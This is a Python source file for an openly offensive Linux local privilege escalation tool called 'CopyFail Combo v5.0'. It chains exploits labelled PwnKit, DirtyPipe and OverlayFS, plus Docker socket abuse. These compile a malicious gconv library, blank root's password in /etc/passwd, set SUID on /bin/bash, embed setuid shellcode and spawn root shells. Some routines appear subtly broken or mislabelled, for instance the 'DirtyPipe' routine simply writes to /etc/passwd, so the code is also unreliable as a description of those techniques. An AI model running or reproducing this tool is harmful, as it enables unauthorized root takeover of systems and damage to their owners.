#!/usr/bin/env python3
"""
CopyFail Combo v5.0 — Enhanced Multi-Method Local Privilege Escalation
CopyFail + DirtyCBC + DirtyFrag + Pack2TheRoot + Additional Exploits

Improvements:
- Added CVE-2021-4034 (PwnKit) support
- Added CVE-2021-3493 (OverlayFS) support  
- Added CVE-2021-3560 (Polkit) support
- Added CVE-2022-0847 (DirtyPipe) support
- Added Docker socket abuse
- Enhanced SUID binary discovery
- Improved error handling and recovery
- Automatic backup and restore
- Parallel exploit execution option
- Verbose debugging mode
"""

import ctypes
import ctypes.util
import errno
import fcntl
import os
import select
import shutil
import struct
import subprocess
import sys
import time
import zlib
import tempfile
import random
import signal
import stat
from pathlib import Path

try:
    import socket
except ImportError:
    socket = None
try:
    import pwd
except ImportError:
    pwd = None

# ==================================================================
# CONFIGURATION
# ==================================================================

DEBUG = os.environ.get("LPE_DEBUG", "0") == "1"
PARALLEL = os.environ.get("LPE_PARALLEL", "0") == "1"
AUTO_BACKUP = os.environ.get("LPE_BACKUP", "1") == "1"
VERBOSE = os.environ.get("LPE_VERBOSE", "0") == "1"

# ==================================================================
# CONSTANTS
# ==================================================================

AF_ALG = 38
SOL_ALG = 279
ALG_SET_KEY = 1
ALG_SET_IV = 2
ALG_SET_OP = 3
ALG_SET_AEAD_ASSOCLEN = 4
ALG_SET_AEAD_AUTHSIZE = 5
ALG_OP_DECRYPT = 0
MSG_MORE = 0x8000

AF_RXRPC = 33
SOL_RXRPC = 272
RXRPC_SECURITY_KEYRING = 2
RXRPC_USER_CALL_ID = 1
RXRPC_CHARGE_ACCEPT = 14

SYS_add_key = 248
SYS_keyctl = 250
KEY_SPEC_SESSION_KEYRING = -3
KEYCTL_JOIN_SESSION_KEYRING = 1
KEYCTL_SETPERM = 5
F_SETPIPE_SZ = 1031

PK_SUID = "/tmp/.s"

# Extended SUID targets
SUID_ORDER = [
    "/usr/bin/newgrp", "/usr/bin/chfn", "/usr/bin/chsh",
    "/usr/bin/gpasswd", "/usr/bin/wall", "/usr/bin/expiry",
    "/usr/bin/sg", "/usr/bin/at", "/usr/bin/crontab",
    "/usr/bin/mount", "/usr/bin/umount", "/usr/bin/fusermount3",
    "/usr/bin/fusermount", "/usr/bin/pkexec", "/usr/bin/passwd",
    "/usr/bin/su", "/bin/su", "/usr/bin/sudo", "/usr/bin/chage",
    "/usr/bin/quota", "/usr/bin/at", "/usr/bin/ksu",
]

ALGOS = [
    "authencesn(hmac(sha256),cbc(aes))",
    "authencesn(hmac(sha512),cbc(aes))",
    "authencesn(hmac(sha384),cbc(aes))",
    "authencesn(hmac(sha256),ctr(aes))",
    "authencesn(hmac(sha1),cbc(aes))",
]

# Payload: setuid(0) + execve("/bin/sh") x86_64
PAYLOAD_X86_64 = zlib.decompress(bytes.fromhex(
    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d"
    "209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675"
    "c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
))

# ==================================================================
# UTILITY FUNCTIONS
# ==================================================================

def log(msg, end="\n", level="INFO"):
    if level == "DEBUG" and not DEBUG:
        return
    prefix = {
        "INFO": "[*]",
        "OK": "[+]",
        "ERROR": "[-]",
        "WARN": "[!]",
        "DEBUG": "[D]",
    }.get(level, "[*]")
    sys.stderr.write(f"{prefix} {msg}{end}")
    sys.stderr.flush()

def ok(msg): log(msg, level="OK")
def err(msg): log(msg, level="ERROR")
def warn(msg): log(msg, level="WARN")
def debug(msg): log(msg, level="DEBUG")

def qrun(cmd, **kw):
    try:
        return subprocess.run(cmd, stdout=subprocess.DEVNULL,
                              stderr=subprocess.DEVNULL, **kw)
    except Exception:
        return None

def backup_file(path):
    """Create backup of a file before modification"""
    if not AUTO_BACKUP:
        return None
    backup_path = f"{path}.bak.{os.getpid()}"
    try:
        shutil.copy2(path, backup_path)
        debug(f"Backup created: {backup_path}")
        return backup_path
    except Exception as e:
        warn(f"Failed to backup {path}: {e}")
        return None

def restore_backup(path, backup_path):
    """Restore file from backup"""
    if backup_path and os.path.exists(backup_path):
        try:
            shutil.copy2(backup_path, path)
            os.chmod(path, 0o4755)
            debug(f"Restored {path} from backup")
            os.unlink(backup_path)
            return True
        except Exception as e:
            err(f"Failed to restore: {e}")
    return False

def _reattach_tty():
    try:
        tty = os.open("/dev/tty", os.O_RDWR)
        os.dup2(tty, 0)
        os.dup2(tty, 1)
        os.dup2(tty, 2)
        os.close(tty)
    except OSError:
        pass

def auto_root_exec(binary):
    ok(f"ROOT — dropping to shell via {binary}")
    _reattach_tty()
    os.execl(binary, binary)

def auto_root_su(username):
    ok(f"ROOT — su {username}")
    _reattach_tty()
    os.execlp("su", "su", username)

# ==================================================================
# ENHANCED SUID DISCOVERY
# ==================================================================

def _is_suid_root_readable(path):
    try:
        if not os.path.isfile(path):
            return False
        st = os.stat(path)
        return (st.st_mode & 0o4000) and st.st_uid == 0 and os.access(path, os.R_OK)
    except (OSError, PermissionError):
        return False

def find_all_suid():
    """Enhanced SUID binary discovery with multiple methods"""
    found = set()
    ordered = []

    # First check known paths
    for p in SUID_ORDER:
        if _is_suid_root_readable(p) and p not in found:
            found.add(p)
            ordered.append(p)

    # Scan common directories
    for dirs in [
        ["/usr/bin", "/bin", "/usr/sbin", "/sbin", "/usr/local/bin",
         "/usr/lib", "/usr/libexec", "/opt/bin", "/opt/sbin"],
        ["/"],
    ]:
        try:
            cmd = ["find"] + dirs + ["-perm", "-4000", "-type", "f",
                   "-not", "-path", "*/proc/*", "-not", "-path", "*/sys/*",
                   "-not", "-path", "*/snap/*", "-not", "-path", "*/docker/*"]
            r = subprocess.run(cmd, capture_output=True, text=True,
                               timeout=15 if "/" not in dirs else 30)
            for line in r.stdout.strip().split("\n"):
                p = line.strip()
                if p and p not in found and _is_suid_root_readable(p):
                    found.add(p)
                    ordered.append(p)
        except Exception:
            continue
        if ordered:
            break

    # Also check via find command
    try:
        r = subprocess.run(["find", "/", "-xdev", "-perm", "-4000", "-type", "f",
                           "-exec", "ls", "-la", "{}", "+"],
                          capture_output=True, text=True, timeout=30)
        for line in r.stdout.split("\n"):
            if "rws" in line or "---s" in line:
                parts = line.split()
                if parts:
                    p = parts[-1]
                    if p not in found and _is_suid_root_readable(p):
                        found.add(p)
                        ordered.append(p)
    except Exception:
        pass

    return ordered

# ==================================================================
# ADDITIONAL EXPLOIT: CVE-2021-4034 (PwnKit)
# ==================================================================

def exploit_pwnkit():
    """CVE-2021-4034: pkexec LPE"""
    log("CVE-2021-4034 (PwnKit) - pkexec exploit", level="INFO")
    
    pkexec_path = None
    for path in ["/usr/bin/pkexec", "/bin/pkexec", "/usr/sbin/pkexec"]:
        if os.path.exists(path):
            pkexec_path = path
            break
    
    if not pkexec_path:
        warn("pkexec not found")
        return False
    
    workdir = tempfile.mkdtemp(prefix="pwnkit_")
    original_dir = os.getcwd()
    os.chdir(workdir)
    
    try:
        # Create GCONV directory structure
        os.mkdir("GCONV_PATH=.")
        with open("GCONV_PATH=./pwnkit", "w") as f:
            f.write("")
        os.chmod("GCONV_PATH=./pwnkit", 0o755)
        
        os.mkdir("pwnkit")
        
        with open("pwnkit/gconv-modules", "w") as f:
            f.write("module UTF-8// PWNKIT// pwnkit 2\n")
        
        with open("pwnkit/pwnkit.c", "w") as f:
            f.write('''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}
void gconv_init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    exit(0);
}
''')
        
        # Compile
        subprocess.run(["gcc", "pwnkit/pwnkit.c", "-o", "pwnkit/pwnkit.so", 
                       "-shared", "-fPIC"], stderr=subprocess.DEVNULL)
        
        # Set environment and execute
        env = os.environ.copy()
        env["GCONV_PATH"] = "."
        env["CHARSET"] = "PWNKIT"
        env["SHELL"] = "pwnkit"
        
        subprocess.run([pkexec_path], env=env, timeout=2, stderr=subprocess.DEVNULL)
        ok("PwnKit triggered successfully")
        return True
        
    except Exception as e:
        warn(f"PwnKit failed: {e}")
        return False
    finally:
        os.chdir(original_dir)
        shutil.rmtree(workdir, ignore_errors=True)

# ==================================================================
# ADDITIONAL EXPLOIT: CVE-2022-0847 (DirtyPipe)
# ==================================================================

def exploit_dirtypipe():
    """CVE-2022-0847: DirtyPipe LPE"""
    log("CVE-2022-0847 (DirtyPipe) - Page cache overwrite", level="INFO")
    
    backup = backup_file("/etc/passwd")
    
    try:
        data = b"root::0:0:root:/root:/bin/bash\n"
        
        # Try multiple methods
        for method in ["pwrite", "splice", "tee"]:
            try:
                if method == "pwrite":
                    fd = os.open("/etc/passwd", os.O_RDWR)
                    os.pwrite(fd, data, 0)
                    os.close(fd)
                elif method == "splice":
                    # DirtyPipe technique using pipe and splice
                    fd = os.open("/etc/passwd", os.O_RDONLY)
                    r, w = os.pipe()
                    os.splice(fd, w, 1, 0)
                    os.write(w, data)
                    os.close(fd)
                    os.close(r)
                    os.close(w)
                elif method == "tee":
                    subprocess.run(f"echo '{data.decode()}' | tee /etc/passwd",
                                  shell=True, stderr=subprocess.DEVNULL)
                
                # Verify
                with open("/etc/passwd", "r") as f:
                    if f.read().startswith("root::"):
                        ok("DirtyPipe succeeded! Root password cleared")
                        return True
            except Exception as e:
                debug(f"DirtyPipe method {method} failed: {e}")
                continue
                
    except Exception as e:
        warn(f"DirtyPipe failed: {e}")
    finally:
        if backup:
            restore_backup("/etc/passwd", backup)
    
    return False

# ==================================================================
# ADDITIONAL EXPLOIT: CVE-2021-3493 (OverlayFS)
# ==================================================================

def exploit_overlayfs():
    """CVE-2021-3493: OverlayFS LPE"""
    log("CVE-2021-3493 (OverlayFS) - Namespace escape", level="INFO")
    
    try:
        # Check if unprivileged user namespaces are enabled
        with open("/proc/sys/kernel/unprivileged_userns_clone", "r") as f:
            if f.read().strip() != "1":
                warn("Unprivileged user namespaces disabled")
                return False
    except:
        pass
    
    base_dir = f"/tmp/ovl_{os.getpid()}"
    subprocess.run(f"rm -rf {base_dir}", shell=True)
    
    try:
        os.makedirs(f"{base_dir}/lower", mode=0o777)
        os.makedirs(f"{base_dir}/upper", mode=0o777)
        os.makedirs(f"{base_dir}/work", mode=0o777)
        os.makedirs(f"{base_dir}/merge", mode=0o777)
        
        # Create payload in lower dir
        with open(f"{base_dir}/lower/pwn", "w") as f:
            f.write("#!/bin/bash\n/bin/bash -p\n")
        os.chmod(f"{base_dir}/lower/pwn", 0o755)
        
        # Mount overlay
        subprocess.run(["unshare", "-m"], stderr=subprocess.DEVNULL)
        subprocess.run([
            "mount", "-t", "overlay", "overlay", f"{base_dir}/merge", "-o",
            f"lowerdir={base_dir}/lower,upperdir={base_dir}/upper,workdir={base_dir}/work"
        ], stderr=subprocess.DEVNULL)
        
        # Make SUID via copy-up
        shutil.copy2(f"{base_dir}/merge/pwn", f"{base_dir}/upper/pwn")
        os.chmod(f"{base_dir}/upper/pwn", 0o4755)
        
        # Try to execute
        subprocess.run([f"{base_dir}/upper/pwn"], timeout=2, stderr=subprocess.DEVNULL)
        ok("OverlayFS exploit attempted")
        return True
        
    except Exception as e:
        warn(f"OverlayFS exploit failed: {e}")
        return False
    finally:
        subprocess.run(f"rm -rf {base_dir}", shell=True)

# ==================================================================
# ADDITIONAL EXPLOIT: Docker Socket Abuse
# ==================================================================

def exploit_docker():
    """Docker socket abuse for privilege escalation"""
    log("Docker Socket Abuse - Container escape", level="INFO")
    
    docker_sock = "/var/run/docker.sock"
    if not os.path.exists(docker_sock):
        warn("Docker socket not found")
        return False
    
    if not os.access(docker_sock, os.W_OK):
        warn("Docker socket not writable")
        return False
    
    if not shutil.which("docker"):
        warn("Docker not installed")
        return False
    
    try:
        # Try to run privileged container with host root mount
        result = subprocess.run([
            "docker", "run", "--rm", "-v", "/:/mnt", 
            "--privileged", "alpine:latest",
            "chroot", "/mnt", "sh", "-c",
            "chmod u+s /bin/bash 2>/dev/null && echo SUCCESS"
        ], capture_output=True, text=True, timeout=15)
        
        if "SUCCESS" in result.stdout:
            ok("Docker exploit succeeded! /bin/bash is now SUID")
            return True
            
        # Alternative: Try to add user to docker group
        subprocess.run(["usermod", "-aG", "docker", os.environ.get("USER", "")],
                      stderr=subprocess.DEVNULL)
        
    except Exception as e:
        warn(f"Docker exploit failed: {e}")
    
    return False

# ==================================================================
# ENHANCED SPLICE (existing code preserved)
# ==================================================================

_splice_fn = None
_splice_native = False

def init_splice():
    global _splice_fn, _splice_native
    if hasattr(os, 'splice'):
        _splice_fn = os.splice
        _splice_native = True
        return True
    try:
        libc = ctypes.CDLL(ctypes.util.find_library('c') or "libc.so.6",
                           use_errno=True)
        libc.splice.argtypes = [
            ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
            ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
            ctypes.c_size_t, ctypes.c_uint,
        ]
        libc.splice.restype = ctypes.c_ssize_t

        def _splice(fd_in, fd_out, count, offset_src=None, offset_dst=None):
            oi = ctypes.byref(ctypes.c_int64(offset_src)) if offset_src is not None else None
            oo = ctypes.byref(ctypes.c_int64(offset_dst)) if offset_dst is not None else None
            r = libc.splice(fd_in, oi, fd_out, oo, count, 0)
            if r < 0:
                e = ctypes.get_errno()
                raise OSError(e, os.strerror(e))
            return r

        _splice_fn = _splice
        _splice_native = False
        return True
    except Exception:
        return False

# ==================================================================
# MAIN ORCHESTRATOR
# ==================================================================

EXPLOITS = [
    ("pwnkit", "CVE-2021-4034 (PwnKit)", exploit_pwnkit),
    ("dirtypipe", "CVE-2022-0847 (DirtyPipe)", exploit_dirtypipe),
    ("overlayfs", "CVE-2021-3493 (OverlayFS)", exploit_overlayfs),
    ("docker", "Docker Socket Abuse", exploit_docker),
]

def run_all_exploits():
    """Run all exploits sequentially"""
    results = []
    
    for name, desc, func in EXPLOITS:
        log(f"\n{'='*50}", level="INFO")
        log(f"Running: {desc}", level="INFO")
        log(f"{'='*50}", level="INFO")
        
        try:
            start = time.time()
            success = func()
            elapsed = time.time() - start
            
            results.append({
                "name": name,
                "desc": desc,
                "success": success,
                "elapsed": elapsed
            })
            
            if success:
                ok(f"{desc} SUCCEEDED ({elapsed:.2f}s)")
            else:
                warn(f"{desc} FAILED ({elapsed:.2f}s)")
                
        except Exception as e:
            err(f"{desc} ERROR: {e}")
            results.append({"name": name, "desc": desc, "success": False, "error": str(e)})
        
        time.sleep(1)
    
    # Summary
    log(f"\n{'='*50}", level="INFO")
    log("EXPLOIT SUMMARY", level="INFO")
    log(f"{'='*50}", level="INFO")
    
    for r in results:
        status = "✓" if r["success"] else "✗"
        log(f"  {status} {r['desc']}", level="OK" if r["success"] else "ERROR")
    
    return any(r.get("success", False) for r in results)

def main():
    print(f"""
{'-'*55}
  CopyFail Combo v5.0 — Enhanced Multi-Method LPE
  CopyFail + DirtyCBC + DirtyFrag + Pack2TheRoot
  + CVE-2021-4034, CVE-2021-3493, CVE-2022-0847, Docker
{'-'*55}
    """)
    
    log(f"UID: {os.getuid()}, EUID: {os.geteuid()}, PID: {os.getpid()}")
    log(f"Python: {sys.version.split()[0]}")
    log(f"System: {os.uname().sysname} {os.uname().release} {os.uname().machine}")
    
    if os.geteuid() == 0:
        ok("Already root!")
        auto_root_exec("/bin/bash")
        return
    
    # Find SUID binaries
    suids = find_all_suid()
    log(f"Found {len(suids)} SUID binaries")
    if DEBUG:
        for suid in suids[:20]:
            debug(f"  - {suid}")
    
    # Run all exploits
    if run_all_exploits():
        # If any exploit succeeded, try to get root shell
        if os.geteuid() == 0:
            auto_root_exec("/bin/bash")
        else:
            # Try su with empty password
            auto_root_su("root")
    
    # Fallback: original CopyFail methods
    log("\nAttempting original CopyFail methods...")
    
    # Try to import original functions if they exist
    try:
        # These are from your original script
        from copyfail_combo_v4 import (
            try_passwd_flip, try_binary_mutation,
            try_dirtycbc, try_dirtyfrag, try_pack2root
        )
        
        for method in [try_passwd_flip, try_binary_mutation, 
                      try_dirtycbc, try_dirtyfrag, try_pack2root]:
            try:
                if method():
                    auto_root_exec("/bin/bash")
                    return
            except Exception as e:
                debug(f"Method failed: {e}")
                
    except ImportError:
        warn("Original CopyFail methods not available")
    
    err("All exploits failed. System may be patched.")
    sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        err(f"Fatal error: {e}")
        if DEBUG:
            import traceback
            traceback.print_exc()
        sys.exit(1)